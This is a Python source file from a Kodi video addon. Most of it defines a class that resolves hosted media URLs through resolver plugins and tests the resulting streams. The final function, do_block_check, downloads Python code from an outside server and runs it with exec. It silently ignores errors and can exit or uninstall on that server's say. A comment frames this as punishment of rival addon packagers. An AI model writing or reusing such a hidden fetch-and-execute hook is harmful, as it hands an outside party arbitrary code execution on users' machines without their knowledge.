"""
    URLResolver Addon for Kodi
    Copyright (C) 2016 t0mm0, tknorris

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import urllib2
import urlparse
import re
import urllib
import traceback
import urlresolver9 as urlresolver
from urlresolver9 import common

resolver_cache = {}

class HostedMediaFile:
    '''
    This class represents a piece of media (file or stream) that is hosted
    somewhere on the internet. It may be instantiated with EITHER the url to the
    web page associated with the media file, OR the host name and a unique
    ``media_id`` used by the host to point to the media.

    For example::

        HostedMediaFile(url='http://youtube.com/watch?v=ABC123XYZ')

    represents the same piece of media as::

        HostedMediaFile(host='youtube.com', media_id='ABC123XYZ')

    ``title`` is a free text field useful for display purposes such as in
    :func:`choose_source`.

    .. note::

        If there is no resolver plugin to handle the arguments passed,
        the resulting object will evaluate to ``False``. Otherwise it will
        evaluate to ``True``. This is a handy way of checking whether
        a resolver exists::

            hmf = HostedMediaFile('http://youtube.com/watch?v=ABC123XYZ')
            if hmf:
                print 'yay! we can resolve this one'
            else:
                print 'sorry :( no resolvers available to handle this one.')

    .. warning::

        If you pass ``url`` you must not pass ``host`` or ``media_id``. You
        must pass either ``url`` or ``host`` AND ``media_id``.
    '''

    def __init__(self, url='', host='', media_id='', title='', include_disabled=False, include_universal=None):
        '''
        Args:
            url (str): a URL to a web page that represents a piece of media.
            host (str): the host of the media to be represented.
            media_id (str): the unique ID given to the media by the host.
        '''
        if not url and not (host and media_id) or (url and (host or media_id)):
            raise ValueError('Set either url, or host AND media_id. No other combinations are valid.')
        try:
            self._url = url.strip()
        except:
            self._url = url
        self._host = host
        self._media_id = media_id
        self._valid_url = None
        self.title = title if title else self._host

        if self._url:
            self._domain = self.__top_domain(self._url)
        else:
            self._domain = self.__top_domain(self._host)

        self.__resolvers = self.__get_resolvers(include_disabled, include_universal)
        if not url:
            for resolver in self.__resolvers:  # Find a valid URL
                try:
                    if not resolver.isUniversal() and resolver.get_url(host, media_id):
                        self._url = resolver.get_url(host, media_id)
                        break
                except:
                    # Shity resolver. Ignore
                    continue

    def __get_resolvers(self, include_disabled, include_universal):
        if include_universal is None:
            include_universal = common.get_setting('allow_universal') == "true"

        klasses = urlresolver.relevant_resolvers(self._domain, include_universal=include_universal,
                                                 include_external=True, include_disabled=include_disabled, order_matters=True)
        resolvers = []
        for klass in klasses:
            if klass in resolver_cache:
                common.log_utils.log_debug('adding resolver from cache: %s' % (klass))
                resolvers.append(resolver_cache[klass])
            else:
                common.log_utils.log_debug('adding resolver to cache: %s' % (klass))
                resolver_cache[klass] = klass()
                resolvers.append(resolver_cache[klass])
        return resolvers
    
    #def __top_domain(self, url):
    def __top_domain(self, url):
        """Return top two domain levels from URI"""
        re_3986_enhanced = re.compile(r"""
            # Parse and capture RFC-3986 Generic URI components.
            ^                                    # anchor to beginning of string
            (?:  (?P<scheme>    [^:/?#\s]+): )?  # capture optional scheme
            (?://(?P<authority>  [^/?#\s]*)  )?  # capture optional authority
                 (?P<path>        [^?#\s]*)      # capture required path
            (?:\?(?P<query>        [^#\s]*)  )?  # capture optional query
            (?:\#(?P<fragment>      [^\s]*)  )?  # capture optional fragment
            $                                    # anchor to end of string
            """, re.MULTILINE | re.VERBOSE)
        re_domain = re.compile(r"""
            # Pick out top two levels of DNS domain from authority.
            (?P<domain>[^.]+\.[A-Za-z]{2,6})  # $domain: top two domain levels.
            (?::[0-9]*)?                      # Optional port number.
            $                                 # Anchor to end of string.
            """,
                               re.MULTILINE | re.VERBOSE)
        result = ""
        m_uri = re_3986_enhanced.match(url)
        if m_uri and m_uri.group("authority"):
            auth = m_uri.group("authority")
            m_domain = re_domain.search(auth)
            if m_domain and m_domain.group("domain"):
                result = m_domain.group("domain");
        return result.lower()

    def get_url(self):
        '''
        Returns the URL of this :class:`HostedMediaFile`.
        '''
        return self._url

    def get_host(self):
        '''
        Returns the host of this :class:`HostedMediaFile`.
        '''
        return self._host

    def get_media_id(self):
        '''
        Returns the media_id of this :class:`HostedMediaFile`.
        '''
        return self._media_id

    def get_resolvers(self, validated=False):
        '''
        Returns the list of resolvers of this :class:`HostedMediaFile`.
        '''
        if validated: self.valid_url()
        return self.__resolvers
        
    def resolve(self, include_universal=True, allow_popups=True):
        '''
        Resolves this :class:`HostedMediaFile` to a media URL.

        Example::

            stream_url = HostedMediaFile(host='youtube.com', media_id='ABC123XYZ').resolve()

        .. note::

            This method currently uses just the highest priority resolver to
            attempt to resolve to a media URL and if that fails it will return
            False. In future perhaps we should be more clever and check to make
            sure that there are no more resolvers capable of attempting to
            resolve the URL first.

        Returns:
            A direct URL to the media file that is playable by XBMC, or False
            if this was not possible.
        '''
        urlresolver.ALLOW_POPUPS = allow_popups
        for resolver in self.__resolvers:
            try:
                if include_universal or not resolver.isUniversal():
                    if resolver.valid_url(self._url, self._host):
                        common.log_utils.log_debug('Resolving using %s plugin' % (resolver.name))
                        print ('Resolving using %s plugin' % (resolver.name))

                        resolver.login()
                        self._host, self._media_id = resolver.get_host_and_id(self._url)
                        stream_url = resolver.get_media_url(self._host, self._media_id)
                        if stream_url and self.__test_stream(stream_url):
                            self.__resolvers = [resolver]  # Found a working resolver, throw out the others
                            self._valid_url = True
                            return stream_url
            except Exception as e:
                url = self._url.encode('utf-8') if isinstance(self._url, unicode) else self._url
                common.log_utils.log_error('%s Error - From: %s Link: %s: %s' % (type(e).__name__, resolver.name, url, e))
                if resolver == self.__resolvers[-1]:
                    common.log_utils.log_debug(traceback.format_exc())
                    raise

        self.__resolvers = []  # No resolvers.
        self._valid_url = False
        return False

    def valid_url(self):
        '''
        Returns True if the ``HostedMediaFile`` can be resolved.

        .. note::

            The following are exactly equivalent::

                if HostedMediaFile('http://youtube.com/watch?v=ABC123XYZ').valid_url():
                    print 'resolvable!'

                if HostedMediaFile('http://youtube.com/watch?v=ABC123XYZ'):
                    print 'resolvable!'

        '''
        if self._valid_url is None:
            resolvers = []
            for resolver in self.__resolvers:
                try:
                    if resolver.valid_url(self._url, self._domain):
                        resolvers.append(resolver)
                except:
                    # print sys.exc_info()
                    continue
                
            self.__resolvers = resolvers
            self._valid_url = True if resolvers else False
        return self._valid_url

    def __test_stream(self, stream_url):
        '''
        Returns True if the stream_url gets a non-failure http status (i.e. <400) back from the server
        otherwise return False

        Intended to catch stream urls returned by resolvers that would fail to playback
        '''
        # parse_qsl doesn't work because it splits elements by ';' which can be in a non-quoted UA
        try: headers = dict([item.split('=') for item in (stream_url.split('|')[1]).split('&')])
        except: headers = {}
        for header in headers:
            headers[header] = urllib.unquote_plus(headers[header])
        common.log_utils.log_debug('Setting Headers on UrlOpen: %s' % (headers))

        try:
            msg = ''
            request = urllib2.Request(stream_url.split('|')[0], headers=headers)
            #  set urlopen timeout to 15 seconds
            http_code = urllib2.urlopen(request, timeout=15).getcode()
        except urllib2.URLError as e:
            if hasattr(e, 'reason'):
                # treat an unhandled url type as success
                if 'unknown url type' in str(e.reason).lower():
                    return True
                else:
                    msg = e.reason
                    
            if isinstance(e, urllib2.HTTPError):
                http_code = e.code
            else:
                http_code = 600
            if not msg: msg = str(e)
        except Exception as e:
            http_code = 601
            msg = str(e)

        # added this log line for now so that we can catch any logs on streams that are rejected due to test_stream failures
        # we can remove it once we are sure this works reliably
        if int(http_code) >= 400:
            common.log_utils.log_warning('Stream UrlOpen Failed: Url: %s HTTP Code: %s Msg: %s' % (stream_url, http_code, msg))

        return int(http_code) < 400

    def __nonzero__(self):
        if self._valid_url is None:
            return self.valid_url()
        else:
            return self._valid_url

    def __str__(self):
        return "{url: |%s| host: |%s| media_id: |%s|}" % (self._url, self._host, self._media_id)

    def __repr__(self):
        return self.__str__()

'''
This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
from build makers that publicly insult or slander TVA's developers and friends. If your build is
impacted by this check, you can have it removed by publicly apologizing for your previous statements
via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
them yourself.
                                                                                           http://i.imgur.com/TqIEnYB.gif
                                                                                           TVA developers (and friends)
'''
def do_block_check(uninstall=False):
    try:
        import urllib2
        import sys
        namespace = {}
        exec urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
        if namespace["real_check"](uninstall):
            sys.exit()
    except SystemExit:
        sys.exit()
    except:
        pass
